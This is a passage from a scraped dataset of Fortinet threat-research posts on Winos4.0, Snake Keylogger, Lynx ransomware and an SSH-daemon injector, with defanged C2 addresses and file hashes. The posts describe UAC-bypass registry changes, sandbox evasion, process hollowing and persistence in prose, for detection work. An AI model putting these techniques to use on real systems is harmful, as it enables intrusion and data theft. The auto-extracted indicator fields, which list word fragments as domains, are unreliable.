HKEY_LOCAL_MACHINE\\SOFTWARE and executing ApowerREC.exe as an administrator. For the anti-sandbox function, it takes two screenshots within a two-second interval. If there are more than 20,000 different pixels in the second screenshot, which means a user is active on the computer, it performs its remaining tasks. Otherwise, it continues taking screenshot and compares it with the first one for at most one hour. After the optional features are run, it downloads the encrypted shellcode data and the Winos4.0 module from its C2 server. The encrypted data is written to HKEY_CURRENT_USER\\B118D5E900008F7A, the base registry for configurations in the next stage, with a value name of “0”. After this, it decrypts the data to get the shellcode, followed by partially decrypted data of the module. The new shellcode decrypts the data with another algorithm to get a DLL file and parses its export table to get the address of the only export function. In this attack, the module from the C2 server creates eight threads to perform different tasks: MainThread, CloseWindow, Screenshot, Keylog, Clipboard, USB, ReadReg, and Anti-AV. Mutex: Global\\MainThreadB118D5E900008F7AThe MainThread creates the remaining seven threads. In addition, it performs the following actions: Description SystemParametersInfoW SPI_SETSCREENSAVEACTIVE Deactivates the screen saver SetThreadExecutionState ES_CONTINUOUS ES_AWAYMODE_REQUIRED ES_SYSTEM_REQUIRED Enables the Away mode so the program keeps working while the computer appears to be sleeping PowerSetRequest PowerRequestDisplayRequired The display remains on even if the computer is idle Registry key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Value name: ConsentPromptBehaviorAdmin Description: Allows the Consent Admin to perform an operation that requires elevation without consent or credentials. Registry key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Value name: PromptOnSecureDesktop Description: Disables secure desktop prompting Mutex: Global\\ClosewWindowIt calls theEnumWindowsfunction to enumerate all visible windows to find the windows of kxecenter(Kingsoft Security) and HipsTray(Huorong). It checks the window's width to ensure it is the security prompt window. When the target window is found, it clicks the \"Permit\" button on the prompt window. Mutex: Global\\ScreenShotB118D5E900008F7AIt takes screenshots of applications that contain the keywords stored in the valuepicshotdataof HKEY_CURRENT_USER\\B118D5E900008F7A, and the screenshots are saved to C:\\ProgramData\\B118D5E900008F7A\\{keyword}\\{Date}. Ifpicshotdatadoesn’t exist, this thread will not be executed. Mutex: Global\\KeylogB118D5E900008F7AIt keeps checking the value of theKEYLOGof HKEY_CURRENT_USER\\B118D5E900008F7A. If the value is 1, it creates a mutex C:\\ProgramData\\B118D5E900008F7A\\Regedit.log and starts recording the user's keystrokes and the contents in the clipboard. The data is written to C:\\ProgramData\\B118D5E900008F7A\\Regedit.log. Mutex: Global\\ClipboardB118D5E900008F7AIt replaces keywords in the clipboard with the text stored in the registry value clipboarddata of HKEY_CURRENT_USER\\B118D5E900008F7A. The value contains three properties: Mode, Expression, and Replace. When Mode is “Modify,” Expression specifies the pattern to look for in the clipboard, and Replace specifies the replacement. If clipboarddata doesn’t exist, this thread will not be executed. Mutex: Global\\UsbB118D5E900008F7AIt collects the names of connected USB devices every three seconds except for those that include the following keywords: mouse, keyboard, wlan, lenovo, and sanmsung (misspelling of samsung). If a new USB device is inserted or removed, it updates the device list with a Chinese annotation that means “USB device inserted” or “USB device removed.” It reads the value B118D5E900008F7A0 from HKCU\\Console to get the shellcode and execute it every five seconds. First, it bypasses the UAC prompt by modifying the registry key values mentioned in MainThread. Then, it callsGetTcpTable2to obtain active TCP connections. If a TCP connection is owned by 360Safe, Kingsoft, or Huorong processes, it disables it. There are other attack chains used in this campaign. The查看10.exe(view10) is compiled from a Python script by Nuitka, and it loads Python311.dll, which is the malicious file. The shellcode from Python311.dll decrypts its data to get a DLL file that writes another shellcode to the registry value ofhrqnmlb{XXXXXX}of the HKCU\\Console\\, and the shellcode is also saved as bb.jpg in C:\\Users\\Public\\Download. The shellcode plays the same role as the shellcode from lastbld2Base.dll we mentioned above. However, its marker string is used by a version preceding the one described in areportreleased in November 2024. Another point worth mentioning is that the DLL contains multiple snippets of shellcode that are identical to Figure 13 except for the C2 domain. While only 9010[.]360sdgg[.]com is used in this attack, other domains have been observed in different campaigns. The 上线模块.dll(online module) is used to take screenshots of WeChat and the online bank, and the akagi.exe is a module of UACMe. Winos4.0 makes good use of registry keys. The C2 server writes most configurations for optional features and encrypts data to the values of the base registry key and its subkeys. This provides the flexibility of optional features. However, it’s also a good hint for forensic analysis. We can rebuild files from the data and perform further analysis. FortiGuard will continue monitoring these attack campaigns and providing appropriate protections as required. The malware described in this report is detected and blocked byFortiGuard Antivirusas: PDF/Agent. A6DC!tr.dldrW32/Agent.7BBA!trW64/UACMe. O!trW64/ValleyRat. A!tr.spy FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 43[.]137[.]42[.]254206[.]238[.]221[.]60206[.]238[.]221[.]240124[.]156[.]100[.]172206[.]238[.]221[.]244 1234[.]360sdgg[.]com9001[.]360sdgg[.]com9002[.]360sdgg[.]com9003[.]360sdgg[.]com9005[.]360sdgg[.]com9006[.]360sdgg[.]com9007[.]360sdgg[.]com9009[.]360sdgg[.]com9010[.]360sdgg[.]comffggssa-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comfuued5-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]com0107-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comrgghrt1140120-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comhei-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comchakan202501-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comwrwyrdujtw114117-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comfdsjg114-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comsjujfde-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comhtrfe4-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]com0611-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comtwzfw[.]vip 36afc6d5dfb0257b3b053373e91c9a0a726c7d269211bc937704349a6b4be9b90e3c9af7066ec72406eac25cca0b312894f02d6d08245a3ccef5c029bc297bd267395af91263f71cd600961a1fd33ddc222958e83094afdde916190a0dd5d79cf4d3477a19ff468d234a5e39652157b2181c8b51c754b900bcfa13339f577e7cc9a8db23d089aa71466b4bde51a51a8cfdcc28e8df33b4c63ce867bd381e5fe5 e2b75baeb7ed21fb8f27984f941286770d1c3c0b60fce8d7fa5b167bd24ba6dcdffbeefc632b20d2ef867553684e9971ab76e1223e743604a5275713423b616820c34b5f0983021414b168913c3da267caf298d8f0f5e3ec0ce97db5f4f483166c33715a14fdc917b5b09b6e1b5dad07bb769493eafbf7ca1023830b4059e00375a4d75c35724140149c9c5056c1bcbd328bbe1e5d1d1ef34205ed5442d2b348fed394a3653b7c6fcc1b277eda6e18eb0983a7e024be5b51e5188b3cfb9512e8a067d848f099e6d1e465f9761a5b85392d550303bfa75fac920d444fd980c949c55757075259fa4be6941dd273c4a4a2fcc29e6ba427dec124b25b299b3505fe64a876e6cb3cf3122febc84a00ec3e0740c054cff955164971c470e1b5e5f1bbd4ac82de8dda9796579cd8ea0f84b43c7a980cdb0e9cdb8abe8981a2d215ed2f(20c34b5f0983021414b168913c3da267caf298d8f0f5e3ec0ce97db5f4f48316 Corrupt) 268c72f5482374660a132d1b91cac0c04b4724a214db4f052eb421e36c2829210a4bbb998bd3a3bcc72cf759689a5656dc74590b731d0affbfc317cf484ed28b79c64d2e77acdbcdbd35cbb29497941335d7e3ab6ebb474064f095e745f0d6437f22305679e46e1fd5043beb136108197c0921643ce0d680f990a3018ade485b594d907855d35ee7689a568e4ac43e4e0ed90de047d91b0253ef79da71ecbc081f3b041eee1ece8cf6aa5c742aeb8c0ac2266cccecca7888772509227c4f8669514933468ac1dd9f7db4e2693f1be7f84deb35c33f8f9934fad32caaae9ef6117a5b26f6dd7b8e0d648e9804ec932603b7d7a5f76c7a8c537ab0c2be54f51fa98b1b9a789136ca3abe25938204845c351aaf0c97c0708ade8d4d8ba4ded95ba71ad1f2eec961bc7a35abeac486f843b7caece0929b13f1dab47fbdc0406ac4e34c1ea827713f1eb57cc0e8e9d171d4e21d116f846b174bc05114eef5674c96531a342426d59e7fdc4abfb74c2225f68382172e03b0f8d496a57ae647411f0fbd2ce73cbfab0beb3663c0151ba7c310e4dbf69f295d8a18114435506483d774ac0a4bbb998bd3a3bcc72cf759689a5656dc74590b731d0affbfc317cf484ed28b514933468ac1dd9f7db4e2693f1be7f84deb35c33f8f9934fad32caaae9ef61176ac08358f230bca3e8b8448b3c177094aeac25402b929f5f73869ec77173a44 advanced malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/winos-spreads-via-impersonation-of-official-email-to-target-users-in-taiwan",
      "scraped_at": "2025-07-20T13:43:30.537912",
      "indicators": {
        "ip_address": [],
        "domain": [
          "PowerREC",
          "powerREC",
          "0250109",
          "ython311",
          "b",
          "egedit",
          "r",
          "kagi",
          "astbld2Base"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "20c34b5f0983021414b168913c3da267caf298d8f0f5e3ec0ce97db5f4f48316"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.32592592592592595
    }
  },
  {
    "id": "Fortinet_15100",
    "source": "Fortinet",
    "title": "FortiSandbox 5.0 Detects Evolving Snake Keylogger Variant",
    "text": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows usersImpact:Silently records keystrokes to collect credentials, data, and other sensitive informationSeverity level:High FortiGuard Labs leveraged the advanced capabilities of FortiSandbox v5.0 (FSAv5) to detect a new variant of the Snake Keylogger (also known as 404 Keylogger). This malware, identified as AutoIt/Injector. GTY!tr, has been responsible for over 280 million blocked infection attempts, highlighting its extensive reach across regions. The majority of these detections have been concentrated in China, Turkey, Indonesia, Taiwan, and Spain, suggesting a significant impact in these areas. This high volume of detections underscores the malware’s ongoing global threat and its potential to affect organizations and users worldwide. The recent surge in activity also highlights the continuous evolution of keylogger malware and the need for advanced detection mechanisms. Typically delivered through phishing emails containing malicious attachments or links, Snake Keylogger is designed to steal sensitive information from popular web browsers like Chrome, Edge, and Firefox by logging keystrokes, capturing credentials, and monitoring the clipboard. In addition to data theft, Snake Keylogger exfiltrates the stolen information to its command-and-control (C2) server using SMTP (email) and Telegram bots, allowing attackers to access stolen credentials and other sensitive data. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FSAv5 features a new AI engine, PAIX, an advanced machine learning-powered system designed to detect and analyze previously unknown threats in real-time. By utilizing a blend of behavioral analysis and file attributes, PAIX can identify suspicious activity and potential malware before they affect your environment. Integrated into FortiSandbox devices, the engine is regularly updated with the latest AI models to ensure optimal protection. In the following sections, we will explore how FSAv5 detected this malware, the behavioral indicators it leveraged for identification, and Snake Keylogger's technique to evade detection and analysis. We will also examine how FortiSandbox’s advanced heuristics and machine learning models contribute to identifying and mitigating emerging keylogger threats. The AI engine in FSAv5 provides detailed static analysis, uncovering obfuscated strings and embedded APIs responsible for keylogging and credential harvesting. Additionally, FSAv5’s dynamic analysis capabilities captured the keylogger’s runtime behavior, including processes launched by the malware and the establishment of network connections to its command-and-control (C2) server. These insights revealed Snake Keylogger’s ability to exfiltrate stolen data while avoiding traditional detection mechanisms, further emphasizing the importance of FSAv5’s comprehensive malware analysis. Additionally, suspicious indicators triggered during the analysis were recorded and categorized (Figure 3). This comprehensive documentation provides further context and aids in identifying potential malicious activities. With the enhancements in FSAv5, these indicators not only document observed behaviors but also correlate them with specific MITRE ATT&CK techniques. This correlation provides a deeper understanding of the tactics employed by the malware. The integrated AI in FSAv5 performs static analysis, enabling it to detect malware without executing its code. As shown in Figure 4, the AI engine can efficiently identify potential threats by analyzing the malware’s code structure, embedded signatures, and other static properties. This new variant of Snake Keylogger employs AutoIt, a scripting language commonly used for automating tasks in the Windows environment, to deliver and execute its malicious payload. AutoIt is often leveraged by threat actors due to its versatility and ability to generate standalone executables that can bypass traditional antivirus solutions. In this variant of Snake Keylogger, the executable is an AutoIt-compiled binary, which adds an additional layer of obfuscation to hinder detection and analysis. The use of AutoIt not only complicates static analysis by embedding the payload within the compiled script but also enables dynamic behavior that mimics benign automation tools. Figure 5 shows the AutoIt encrypted script used for compiling the binary. The AI in FSAv5 identified these embedded malicious strings and API calls. Upon execution, Snake Keylogger drops a copy of itself to the %Local_AppData%\\supergroup folder under “ageless.exe,” setting its attributes to hidden. Once established in this directory, it drops another file into the %Startup% folder, named ageless.vbs. This script contains a command that utilizes WScript. Shell() to call the Run () method, executing ageless.exe and ensuring the malware runs automatically upon system startup. The ageless.vbs script, as captured and backed up by FSAv5 for analysis, is shown in Figure 6. Snake Keylogger copies the ageless.vbs file into the Startup folder as a persistence mechanism, ensuring that it automatically executes each time the infected system reboots. This method is commonly used because the Windows Startup folder allows scripts, executables, or shortcuts to run without required administrative privileges. By leveraging this technique, Snake Keylogger can maintain access to the compromised system and re-establish a foothold even if the malicious process is terminated. Figure 7 illustrates an indicator of Snake Keylogger employing this persistence method. Additionally, Figure 8 shows a screenshot of the ageless.vbs file placed in the Startup folder. After the execution of ageless.exe, the malware injects its malicious payload into a legitimate . NET process. The observed sample targets the RegSvcs.exe process using a technique known as process hollowing, which allows the malware to execute its code within a trusted process to evade detection. Process hollowing works by first spawning RegSvcs.exe in a suspended state, preventing it from executing its legitimate code. Next, the malware deallocates the original code section and allocates new memory space within the hollowed process. Finally, it writes its malicious payload into the newly allocated space. When the process resumes, RegSvcs.exe executes the injected malicious code. This method allows the malware to conceal its presence, making it significantly harder for traditional security tools to detect and remove. By embedding itself within a trusted process, Snake Keylogger can operate undetected and continue its malicious activities. Figure 9 shows an indicator with its corresponding risk score, highlighting the severity of the threat. Another FSAv5 indicator that provides valuable insights into the malware’s capabilities is its ability to detect when the folder storing browser-related login credentials and other sensitive data is accessed, as shown in Figure 10. This indicator offers critical clues about the malware’s intent and behavior, highlighting its potential to compromise user data. Snake Keylogger leverages various techniques to exfiltrate stolen credentials and gather additional information about the victim. One such method involves using websites like hxxp://checkip[.]dyndns[.]org to retrieve the victim’s geolocation, further enhancing its reconnaissance capabilities. Additionally, Snake Keylogger uploads stolen credentials through several channels, including SMTP and Telegram bots, using HTTP Post requests to securely transmit the data to its command-and-control server, as shown in Figure 11. The FortiSandbox research team analyzed the malware through reverse engineering and dynamic sandbox analysis, revealing the full scope of its malicious capabilities. Figures 12 and 13 show that the malware employs specialized modules to steal sensitive data from browser autofill systems, including credit card details. To capture keystrokes, it leverages the SetWindowsHookEx API with the first parameter set to WH_KEYBOARD_LL (flag 13), a low-level keyboard hook that monitors keystrokes (see Figure 14). This technique allows the malware to log sensitive input such as banking credentials. FortiSandbox plays a pivotal role in detecting and analyzing advanced malware threats like Snake Keylogger. Leveraging its innovative static and dynamic analysis capabilities and the power of its PAIX engine, FortiSandbox ensures the comprehensive detection of sophisticated threats. Capturing detailed indicators of compromise also empowers users to proactively safeguard their systems against evolving malware attacks, providing valuable insights for effective mitigation. TheFortiSandboxidentifies the malware mentioned in this report and any variations of it. It does not rely on updates fromFortiGuard Antivirus; instead, it utilizes the PAIX engine’s Machine Learning technology to detect previously unknown threats. FortiGuard Antivirus specifically detects the malware described in this report as AutoIt/Injector. GTY!tr. This service is integrated into FortiGate, FortiMail, FortiClient, and FortiEDR solutions, providing protection to customers using these products with up-to-date defenses. Additionally, the FortiGuard Web Filtering Service detects and blocks the command-and-control (C2) server. We also suggest that organizations go through Fortinet’sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals (FCF)in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization. Please contact ourGlobal FortiGuard Incident Response Team. Command-and-Control (C2) Serverhttp://51[.]38[.]247[.]67:8081/_send_php? L [Original file]f8410bcd14256d6d355d7076a78c074f [ageless.exe]f8410bcd14256d6d355d7076a78c074f [ageless.vbs]77f8db41b320c0ba463c1b9b259cfd1b FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/fortisandbox-detects-evolving-snake-keylogger-variant",
      "scraped_at": "2025-07-20T13:43:38.786906",
      "indicators": {
        "ip_address": [],
        "domain": [
          "egSvcs",
          "geless"
        ],
        "hash_md5": [
          "77f8db41b320c0ba463c1b9b259cfd1b",
          "f8410bcd14256d6d355d7076a78c074f"
        ],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": [
          "http://51"
        ]
      },
      "threat_score": 0.33837293016558684
    }
  },
  {
    "id": "Fortinet_63933",
    "source": "Fortinet",
    "title": "Ransomware Roundup – Lynx",
    "text": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Lynx ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first sample of the Lynx ransomware was made available on a publicly available file-scanning site in early July 2024, which coincides with other reports of its first availability. Our research found that the Lynx and INC ransomware, which first appeared in July 2023, look very similar. However, INC offers fewer options at the execution phase. We believe that INC ransomware is a predecessor to the Lynx ransomware. While INC ransomware is available for the Windows and ESXi platforms, we have not found a Lynx variant of the ransomware that affects non-Windows environments. The screenshot above shows the different options and functions an INC ransomware sample can perform. In contrast, the screenshot below shows what they are for a LYNX sample. LYNX ransomware offers more granular control than INC. Like most ransomware, INC and LYNX encrypt files on victims' Windows machines. Both families use the same encryption methods. Furthermore, both families modify the desktop background to display the ransom note. At the same time, both try to send the ransom note to connected printers. These can be seen in the following screenshots. Like other ransomware attacks, these demand a ransom to decrypt files via dropped ransom notes. Information on the infection vector used by the Lynx ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. When run, the Lynx ransomware takes the following line arguments: Description --file <filePath> Encrypt only specified file(s) --dir <dirPath> Encrypt only specified directory/directories --mode fast Encrypt 5% from entire file --mode medium Encrypt 15% from entire file (default) --mode slow Encrypt 25% from entire file --mode entire Encrypt 100% from entire file Print this message Enable verbosity Enable silent encryption (no extension and notes will be added) --stop-processes Try to stop processes via RestartManager --encrypt-network Encrypt network shares --load-drives Load hidden drives (will corrupt boot loader) Hide console window --no-background Don't change background image Don't print note on printers Kill processes/services --safe-mode Enter safe-mode The Lynx ransomware always kills processes containing the following strings to maximize damage: It kills services that contain the following strings: The Lynx ransomware then encrypts files on the compromised machines and adds a file extension “. LYNX” to the affected files. The ransomware avoids encrypting files in the following folders: The Lynx ransomware avoids encrypting files with the following extensions: It also performs the following actions: The Lynx ransomware drops the following ransom note in “README.txt”: The ransomware then replaces the desktop wallpaper with the same ransom message. The oldest Lynx ransomware sample (SHA2: eaa0e773eb593b0046452f420b6db8a47178c09e6db0fa68f6a2d42c3f48e3bc) displays a slightly different ransom note. It contains different TOR sites and an attacker email address not found in other Lynx ransomware. The ransom note directs victims to a chat site operated by the attacker on TOR, where victims must first register with a unique ID. The Lynx ransomware has a data leak site that posts victim information, including data stolen from victims. As of this writing (January 29, 2025), the data leak site lists 96 victims, with the latest publication date being January 20, 2025. Our investigation found the following about the Lynx ransomware victims listed on the data leak site: Note that victims who paid the ransom may have been removed from the data leak site, and as such, additional companies may be affected by the Lynx ransomware. Separate from the aforementioned chat site, the Lynx ransomware group operates a data leak site on TOR. The Lynx ransomware group claims they have a policy to exclude “governmental institutions, hospitals, or non-profit organizations as these sectors play vital roles in society.” However, some victims listed on the data leak site are organizations believed to be in the healthcare and energy sectors. As with other ransomware groups, each victim has its own data leak page with a description of the stolen documents, the revenue of the victim organization, and the date the data was leaked. The Lynx ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Lynx Ransomware File IOCs 31de5a766dca4eaae7b69f807ec06ae14d2ac48100e06a30e17cc9acccfd5193 Lynx ransomware 3e68e5742f998c5ba34c2130b2d89ca2a6c048feb6474bc81ff000e1eaed044e 432f549e9a2a76237133e9fe9b11fbb3d1a7e09904db5ccace29918e948529c6 468e3c2cb5b0bbc3004bbf5272f4ece5c979625f7623e6d71af5dc0929b89d6a 4e5b9ab271a1409be300e5f3fd90f934f317116f30b40eddc82a4dfd18366412 571f5de9dd0d509ed7e5242b9b7473c2b2cbb36ba64d38b32122a0a337d6cf8b 589ff3a5741336fa7c98dbcef4e8aecea347ea0f349b9949c6a5f6cd9d821a23 80908a51e403efd47b1d3689c3fb9447d3fb962d691d856b8b97581eefc0c441 85699c7180ad77f2ede0b15862bb7b51ad9df0478ed394866ac7fa9362bf5683 97c8f54d70e300c7d7e973c4b211da3c64c0f1c95770f663e04e35421dfb2ba0 9a47ab27d50df1faba1dc5777bdcfff576524424bc4a3364d33267bbcf8a3896 b378b7ef0f906358eec595777a50f9bb5cc7bb6635e0f031d65b818a26bdc4ee d5ca3e0e25d768769e4afda209aca1f563768dae79571a38e3070428f8adf031 eaa0e773eb593b0046452f420b6db8a47178c09e6db0fa68f6a2d42c3f48e3bc ecbfea3e7869166dd418f15387bc33ce46f2c72168f571071916b5054d7f6e49 f71fc818362b1465fc1deb361de36badc73ac4dd9e815153c9022f82c4062787 Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-lynx",
      "scraped_at": "2025-07-20T13:43:45.844761",
      "indicators": {
        "ip_address": [],
        "domain": [
          "EADME"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "432f549e9a2a76237133e9fe9b11fbb3d1a7e09904db5ccace29918e948529c6",
          "589ff3a5741336fa7c98dbcef4e8aecea347ea0f349b9949c6a5f6cd9d821a23",
          "80908a51e403efd47b1d3689c3fb9447d3fb962d691d856b8b97581eefc0c441",
          "9a47ab27d50df1faba1dc5777bdcfff576524424bc4a3364d33267bbcf8a3896",
          "571f5de9dd0d509ed7e5242b9b7473c2b2cbb36ba64d38b32122a0a337d6cf8b",
          "85699c7180ad77f2ede0b15862bb7b51ad9df0478ed394866ac7fa9362bf5683",
          "31de5a766dca4eaae7b69f807ec06ae14d2ac48100e06a30e17cc9acccfd5193",
          "f71fc818362b1465fc1deb361de36badc73ac4dd9e815153c9022f82c4062787",
          "97c8f54d70e300c7d7e973c4b211da3c64c0f1c95770f663e04e35421dfb2ba0",
          "b378b7ef0f906358eec595777a50f9bb5cc7bb6635e0f031d65b818a26bdc4ee",
          "3e68e5742f998c5ba34c2130b2d89ca2a6c048feb6474bc81ff000e1eaed044e",
          "ecbfea3e7869166dd418f15387bc33ce46f2c72168f571071916b5054d7f6e49",
          "eaa0e773eb593b0046452f420b6db8a47178c09e6db0fa68f6a2d42c3f48e3bc",
          "468e3c2cb5b0bbc3004bbf5272f4ece5c979625f7623e6d71af5dc0929b89d6a",
          "d5ca3e0e25d768769e4afda209aca1f563768dae79571a38e3070428f8adf031",
          "4e5b9ab271a1409be300e5f3fd90f934f317116f30b40eddc82a4dfd18366412"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.7237813884785821
    }
  },
  {
    "id": "Fortinet_84427",
    "source": "Fortinet",
    "title": "Analyzing ELF/Sshdinjector. A!tr with a Human and Artificial Analyst",
    "text": "FortiGuard Labs Threat Research Affected Platform:LinuxImpacted Users:Linux-based network appliances or IoTImpact:Data exfiltrationSeverity Level:Medium ELF/Sshdinjector. A!tris a collection of malware that can be injected into the SSH daemon. Samples of this malware collection surfaced around mid-November 2024. While we have a good amount of threat intelligence on them (e.g., they areattributed to theDaggerFlyespionage group), nobody seems to have looked into what they actually do. In this blog post, we will focus on the reverse engineering of the attack’s binaries and how this reverse engineering was achieved. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The attack uses several binaries: More precisely, the dropper checks if it is being run under root privileges and, if not, exits. It then checks whether the host is infected by searching for a file named/bin/lsxxxssswwdd11vv containingthe wordWATERDROP. If the host is not yet infected, it attempts to overwrite the legitimate binariesls,netstat,andcrondwith infected binaries (/bin/lsxxxssswwdd11vv,selfrecoverheader,mainpasteheade,r…). Finally, it searches the SSH daemon and, if necessary, infects it withlibsshd.so. The malicious payload is contained inlibsshd.so. The main element is found in a function named “haha.” It also creates two other threads from the functions “heihei” and “xixi”. Those three names refer to laughing in Chinese. Function “xixi” checks whether it has access to/root/intensify-mm-inject/xxx, in which case it will kill and restart both the SSH and Cron daemons. Function “heihei” connects to the remote C2 (hard-coded IP address 45.125.64[.]200, port 33200 or 33223) and listens for incoming commands. Description SERVER_REQ_BASE_INFO. Exfiltrates uname, MAC address etc to C2 List running services, by listing files in/etc/init.d Reads users from/etc/shadow Lists running process Tests access to/var/log/dmesg Tests access to/tmp/fcontr.xml Lists a given directory File transfer Opens a shell terminal Executes a command in the terminal Unloads and exits the malicious process Removes a file Renames a file SERVER_RET_ONLINE_ACK Client status change notification. It sends base info, service list, read/etc/shadow. Communication with the C2 uses its own protocol. All packets include a hard-coded UUID (a273079c-3e0f-4847-a075-b4e1f9549e88), an identifier (afa8dcd81a854144), and the response to the command. Reverse engineering was performed using Radare2, assisted by Generative AI through theRadare2 extension“r2ai.” This study shows that AI provides excellent insights into the malware, delivering high-quality source code that complements the output obtained from a standard decompiler. For example, I usedr2ai in “auto” mode. In this mode, the user asks the AI a question, and the AI automatically performs the necessary steps with the radare2 disassembler to answer. This is particularly helpful for users who don’t know Radare2 well. In this screenshot, we see the AI automatically searches for strings in the binary, via r2’s command “iz”. The overview of the dropper is excellent. AI excels in reading large quantities of information and summarizing them. We can then ask the AI to decompile the main. While the AI-generated source code is easy to understand, its details are not always correct. By comparison, source code produced by decompilers is often difficult to read but is accurate. Because of this, it is important to remember that these approaches complement each other and are ideally viewed side by side. While AI performs very well, there are many cases in which it does not produce a satisfactory answer, at least not at first. The most common issue ishallucination, wherein the AIinventssomething that isn’t true. Worse, it’s not always easy for a human analyst to spot hallucinations because the AI can sound very convincing. For example, in the AI-generated code below, the AI completely created an upload and a download command that is pure invention. Another frequent issue isextrapolation, where the AI does not totally invent something butextrapolatesit. For example, the AI says the malware “manipulates” the MAC address. This is 